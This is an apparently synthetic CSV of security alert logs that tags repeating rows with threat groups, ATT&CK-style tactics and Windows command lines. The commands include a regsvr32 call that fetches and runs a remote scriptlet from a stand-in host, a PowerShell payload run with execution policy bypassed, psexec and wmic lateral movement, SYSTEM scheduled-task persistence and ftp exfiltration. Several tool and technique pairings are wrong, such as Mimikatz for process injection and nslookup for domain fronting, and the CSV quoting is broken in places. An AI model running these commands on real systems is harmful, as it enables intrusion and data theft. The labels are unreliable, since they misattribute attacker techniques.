ID,Date,Time,Severity,Host,Source_IP,Attack,Attack_Details
7ca0a33f-20dc-4e50-b2dc-7c168be60f34,2023-01-02,10:30:01,High,HP1234F,192.168.1.100,APT29,"{""Tactic"": ""Command and Control"", ""Technique"": ""Domain Fronting"", ""Tool"": ""Cobalt Strike"", ""Process"": ""explorer.exe"", ""Command"": ""C:\Windows\System32\nslookup.exe 192.168.1.1 -t ANY""}"
8f55d5c9-1382-4295-8b8a-2a2dc7f74b1f,2023-01-03,08:20:00,Medium,DL4321A,192.168.1.102,FIN7,"{""Tactic"": ""Defense Evasion"", ""Technique"": ""Process Injection"", ""Tool"": ""Mimikatz"", ""Process"": ""svchost.exe"", ""Command"": ""C:\Windows\System32\rundll32.exe C:\Users\Public\sample.dll,EntryPoint""}"
e8ddbd89-8409-4fcb-bd11-1e8c62ea290b,2023-01-05,14:20:10,High,HP1234B,192.168.1.104,APT32,"{""Tactic"": ""Initial Access"", ""Technique"": ""Spearphishing Attachment"", ""Tool"": ""Unknown"", ""Process"": ""winword.exe"", ""Command"": ""C:\Windows\System32\powershell.exe -ExecutionPolicy Bypass -File C:\Users\Public\payload.ps1""}"
f1406c53-6efc-479c-8791-ec77a31cf7a3,2023-01-06,13:45:00,Medium,HP4321F,192.168.1.107,SandWorm,"{""Tactic"": ""Lateral Movement"", ""Technique"": ""Pass the Ticket"", ""Tool"": ""PsExec"", ""Process"": ""lsass.exe"", ""Command"": ""C:\Windows\System32\psexec.exe -accepteula -s \\target-pc cmd.exe /c C:\Users\Public\sample.bat""}"
b0d1625b-0c3a-4227-8f18-f0f0a2341c54,2023-01-09,10:15:30,Low,DL1234C,192.168.1.110,APT33,"{""Tactic"": ""Defense Evasion"", ""Technique"": ""DLL Side-Loading"", ""Tool"": ""Unknown"", ""Process"": ""notepad.exe"", ""Command"": ""C:\Program Files\Common Files\Microsoft Shared\Office16\FLUENT11.DLL""}"
c1d58af9-dc13-43a8-a0f5-d5d29b97a2b5,2023-01-10,09:55:45,Medium,HP5432F,192.168.1.113,Cobalt Strike,"{""Tactic"": ""Exfiltration"", ""Technique"": ""Exfiltration Over Command and Control Channel"", ""Tool"": ""Unknown"", ""Process"": ""cmd.exe"", ""Command"": ""C:\Windows\System32\ftp.exe -s:C:\Users\Public\ftpscript.txt""}"
f0d97f70-5d5c-401f-a5c5-0b5f77183d9e,2023-01-11,14:10:00,High,DL4321E,192.168.1.116,FIN10,"{""Tactic"": ""Persistence"", ""Technique"": ""Scheduled Task/Job"", ""Tool"": ""Unknown"", ""Process"": ""taskhost.exe"", ""Command"": ""C:\Windows\System32\schtasks.exe /Create /RU SYSTEM /TN "Task" /SC DAILY /TR "C:\Users\Public\payload.bat" /ST 12:00""}"
7e630e89-96ce-4a05-8659-6af3a6d46a6a,2023-01-14,10:30:01,High,HP1234G,192.168.1.100,APT29,"{""Tactic"": ""Command and Control"", ""Technique"": ""Domain Fronting"", ""Tool"": ""Cobalt Strike"", ""Process"": ""explorer.exe"", ""Command"": ""C:\Windows\System32\nslookup.exe example.com -t ANY""}"
e04430a2-1ca2-47f3-b48a-3c3c732819c3,2023-01-15,08:20:00,Medium,DL5432A,192.168.1.102,FIN7,"{""Tactic"": ""Defense Evasion"", ""Technique"": ""Process Injection"", ""Tool"": ""Mimikatz"", ""Process"": ""winlogon.exe"", ""Command"": ""C:\Windows\System32\regsvr32.exe /s /u /i:http://example.com/file.sct scrobj.dll""}"
0e8c080b-5c2c-460d-bad4-12d4f4dc4b4a,2023-01-18,14:20:10,High,HP5432K,192.168.1.104,APT32,"{""Tactic"": ""Initial Access"", ""Technique"": ""Spearphishing Attachment"", ""Tool"": ""Unknown"", ""Process"": ""powerpoint.exe"", ""Command"": ""C:\Windows\System32\cmd.exe /c C:\Users\Public\payload.bat""}"
f83c7c2d-602c-4d58-a88b-2226f9a35e6c,2023-01-19,13:45:00,Medium,DL1234H,192.168.1.107,SandWorm,"{""Tactic"": ""Lateral Movement"", ""Technique"": ""Pass the Hash"", ""Tool"": ""WMI"", ""Process"": ""services.exe"", ""Command"": ""C:\Windows\System32\wbem\wmic.exe /node:target-pc process call create ""C:\Users\Public\sample.bat""""}"
5d999f1e-e558-4d8b-9f3a-3fb5d5b5a5f5,2023-01-22,10:30:01,High,HP1234D,192.168.1.100,APT29,"{""Tactic"": ""Command and Control"", ""Technique"": ""Domain Fronting"", ""Tool"": ""Cobalt Strike"", ""Process"": ""explorer.exe"", ""Command"": ""C:\Windows\System32\nslookup.exe example.com -t ANY""}"
e024a88a-6d97-4c46-af80-92c87dce45b7,2023-01-23,08:20:00,Medium,DL4321K,192.168.1.102,FIN7,"{""Tactic"": ""Defense Evasion"", ""Technique"": ""Process Injection"", ""Tool"": ""Mimikatz"", ""Process"": ""svchost.exe"", ""Command"": ""C:\Windows\System32\rundll32.exe C:\Users\Public\sample.dll,EntryPoint""}"
e14a8792-1e50-4742-9561-d2030a8b13c7,2023-01-25,14:20:10,High,HP5432M,192.168.1.104,APT32,"{""Tactic"": ""Initial Access"", ""Technique"": ""Spearphishing Attachment"", ""Tool"": ""Unknown"", ""Process"": ""winword.exe"", ""Command"": ""C:\Windows\System32\powershell.exe -ExecutionPolicy Bypass -File C:\Users\Public\payload.ps1""}"
a26b0c7d-2d04-4a1e-b2e2-7e9d9d0a7ca6,2023-01-26,13:45:00,Medium,HP4321K,192.168.1.107,SandWorm,"{""Tactic"": ""Lateral Movement"", ""Technique"": ""Pass the Ticket"", ""Tool"": ""PsExec"", ""Process"": ""lsass.exe"", ""Command"": ""C:\Windows\System32\psexec.exe -accepteula -s \target-pc cmd.exe /c C:\Users\Public\sample.bat""}"
5a65c408-5ab5-4f92-af3a-5a5a9358d429,2023-01-29,10:15:30,Low,DL1234D,192.168.1.110,APT33,"{""Tactic"": ""Defense Evasion"", ""Technique"": ""DLL Side-Loading"", ""Tool"": ""Unknown"", ""Process"": ""notepad.exe"", ""Command"": ""C:\Program Files\Common Files\Microsoft Shared\Office16\FLUENT11.DLL""}"
c6fb4913-bbb9-4323-9b7c-3f50ed53c238,2023-01-30,09:55:45,Medium,HP1234K,192.168.1.113,Cobalt Strike,"{""Tactic"": ""Exfiltration"", ""Technique"": ""Exfiltration Over Command and Control Channel"", ""Tool"": ""Unknown"", ""Process"": ""cmd.exe"", ""Command"": ""C:\Windows\System32\ftp.exe -s:C:\Users\Public\ftpscript.txt""}"
9fba5bc5-6560-4d8c-bf0b-70b0406db160,2023-02-01,14:10:00,High,DL4321M,192.168.1.116,FIN10,"{""Tactic"": ""Persistence"", ""Technique"": ""Scheduled Task/Job"", ""Tool"": ""Unknown"", ""Process"": ""taskhost.exe"", ""Command"": ""C:\Windows\System32\schtasks.exe /Create /RU SYSTEM /TN "Task" /SC DAILY /TR "C:\Users\Public\payload.bat" /ST 12:00""}"
a1e4a4d3-4c4c-4c58-b7a3-247a3fc50714,2023-02-02,10:30:01,High,HP1234E,192.168.1.100,APT29,"{""Tactic"": ""Command and Control"", ""Technique"": ""Domain Fronting"", ""Tool"": ""Cobalt Strike"", ""Process"": ""explorer.exe"", ""Command"": ""C:\Windows\System32\nslookup.exe 192.168.1.1 -t ANY""}"
1f463ec1-8bf7-4c16-a3da-4b2c87840d7e,2023-02-03,08:20:00,Medium,DL5432C,192.168.1.102,FIN7,"{""Tactic"": ""Defense Evasion"", ""Technique"": ""Process Injection"", ""Tool"": ""Mimikatz"", ""Process"": ""winlogon.exe"", ""Command"": ""C:\Windows\System32\regsvr32.exe /s /u /i:http://example.com/file.sct scrobj.dll""}"
5d2b0f6b-e59c-48ed-8a1a-9b55872f8fa0,2023-02-06,14:20:10,High,HP5432N,192.168.1.104,APT32,"{""Tactic"": ""Initial Access"", ""Technique"": ""Spearphishing Attachment"", ""Tool"": ""Unknown"", ""Process"": ""powerpoint.exe"", ""Command"": ""C:\Windows\System32\cmd.exe /c C:\Users\Public\payload.bat""}"
6dbf44b7-96b3-47b7-b2d1-3f3e3b1ad26c,2023-02-07,13:45:00,Medium,DL1234K,192.168.1.107,SandWorm,"{""Tactic"": ""Lateral Movement"", ""Technique"": ""Pass the Hash"", ""Tool"": ""WMI"", ""Process"": ""services.exe"", ""Command"": ""C:\Windows\System32\wbem\wmic.exe /node:target-pc process call create ""C:\Users\Public\sample.bat""""}"
37cc3d01-771c-48ec-bc67-937e10a142a9,2023-02-10,10:30:01,High,HP1234H,192.168.1.100,APT29,"{""Tactic"": ""Command and Control"", ""Technique"": ""Domain Fronting"", ""Tool"": ""Cobalt Strike"", ""Process"": ""explorer.exe"", ""Command"": ""C:\Windows\System32\nslookup.exe example.com -t ANY""}"
3a25d3f2-e8a9-4075-9f03-cc3a9655f01e,2023-02-11,08:20:00,Medium,DL4321N,192.168.1.102,FIN7,"{""Tactic"": ""Defense Evasion"", ""Technique"": ""Process Injection"", ""Tool"": ""Mimikatz"", ""Process"": ""svchost.exe"", ""Command"": ""C:\Windows\System32\rundll32.exe C:\Users\Public\sample.dll,EntryPoint""}"
949e6665-5b43-452c-b70a-c1ef984a6c1f,2023-02-13,14:20:10,High,HP5432P,192.168.1.104,APT32,"{""Tactic"": ""Initial Access"", ""Technique"": ""Spearphishing Attachment"", ""Tool"": ""Unknown"", ""Process"": ""winword.exe"", ""Command"": ""C:\Windows\System32\powershell.exe -ExecutionPolicy Bypass -File C:\Users\Public\payload.ps1""}"
c72f7b04-1f5a-44e2-b9b1-9b484f875bd6,2023-02-14,13:45:00,Medium,HP4321N,192.168.1.107,SandWorm,"{""Tactic"": ""Lateral Movement"", ""Technique"": ""Pass the Ticket"", ""Tool"": ""PsExec"", ""Process"": ""lsass.exe"", ""Command"": ""C:\Windows\System32\psexec.exe -accepteula -s \target-pc cmd.exe /c C:\Users\Public\sample.bat""}"
dbb132d4-7e05-4066-9e6f-1a766a320ab7,2023-02-17,10:15:30,Low,DL1234E,192.168.1.110,APT33,"{""Tactic"": ""Defense Evasion"", ""Technique"": ""DLL Side-Loading"", ""Tool"": ""Unknown"", ""Process"": ""notepad.exe"", ""Command"": ""C:\Program Files\Common Files\Microsoft Shared\Office16\FLUENT11.DLL""}"
ce310d6f-5e5c-4bb3-aef5-5e5d9c5be5b5,2023-02-18,09:55:45,Medium,HP1234L,192.168.1.113,Cobalt Strike,"{""Tactic"": ""Exfiltration"", ""Technique"": ""Exfiltration Over Command and Control Channel"", ""Tool"": ""Unknown"", ""Process"": ""cmd.exe"", ""Command"": ""C:\Windows\System32\ftp.exe -s:C:\Users\Public\ftpscript.txt""}"
578f1d27-e381-4f8e-9fb1-d304aebe65d7,2023-02-20,14:10:00,High,DL4321N,192.168.1.116,FIN10,"{""Tactic"": ""Persistence"", ""Technique"": ""Scheduled Task/Job"", ""Tool"": ""Unknown"", ""Process"": ""taskhost.exe"", ""Command"": ""C:\Windows\System32\schtasks.exe /Create /RU SYSTEM /TN "Task" /SC DAILY /TR "C:\Users\Public\payload.bat" /ST 12:00""}"
d6b9e9f9-656b-4b18-9d5c-b6e2e732b4a4,2023-02-21,10:30:01,High,HP1234F,192.168.1.100,APT29,"{""Tactic"": ""Command and Control"", ""Technique"": ""Domain Fronting"", ""Tool"": ""Cobalt Strike"", ""Process"": ""explorer.exe"", ""Command"": ""C:\Windows\System32\nslookup.exe 192.168.1.1 -t ANY""}"
d77153d5-986a-4b9e-9e51-2ef276b5a2f2,2023-02-24,08:20:00,Medium,DL5432L,192.168.1.102,FIN7,"{""Tactic"": ""Defense Evasion"", ""Technique"": ""Process Injection"", ""Tool"": ""Mimikatz"", ""Process"": ""winlogon.exe"", ""Command"": ""C:\Windows\System32\regsvr32.exe /s /u /i:http://example.com/file.sct scrobj.dll""}"
d9a67f2b-64b6-4ed6-a4c6-fb23a15f4f5d,2023-02-25,14:20:10,High,HP5432Q,192.168.1.104,APT32,"{""Tactic"": ""Initial Access"", ""Technique"": ""Spearphishing Attachment"", ""Tool"": ""Unknown"", ""Process"": ""powerpoint.exe"", ""Command"": ""C:\Windows\System32\cmd.exe /c C:\Users\Public\payload.bat""}"
078a31b9-53d6-47d6-bec8-129eb29417bb,2023-02-26,13:45:00,Medium,DL1234L,192.168.1.107,SandWorm,"{""Tactic"": ""Lateral Movement"", ""Technique"": ""Pass the Hash"", ""Tool"": ""WMI"", ""Process"": ""services.exe"", ""Command"": ""C:\Windows\System32\wbem\wmic.exe /node:target-pc process call create ""C:\Users\Public\sample.bat""""}"
233b3126-0e71-4135-8dfe-7041b30a8b9f,2023-02-27,10:15:30,Low,DL4321E,192.168.1.110,APT33,"{""Tactic"": ""Defense Evasion"", ""Technique"": ""DLL Side-Loading"", ""Tool"": ""Unknown"", ""Process"": ""notepad.exe"", ""Command"": ""C:\Program Files\Common Files\Microsoft Shared\Office16\FLUENT11.DLL""}"
bb0d528a-d61f-4666-92d8-8a102d28eeca,2023-03-01,09:55:45,Medium,HP1234M,192.168.1.113,Cobalt Strike,"{""Tactic"": ""Exfiltration"", ""Technique"": ""Exfiltration Over Command and Control Channel"", ""Tool"": ""Unknown"", ""Process"": ""cmd.exe"", ""Command"": ""C:\Windows\System32\ftp.exe -s:C:\Users\Public\ftpscript.txt""}"
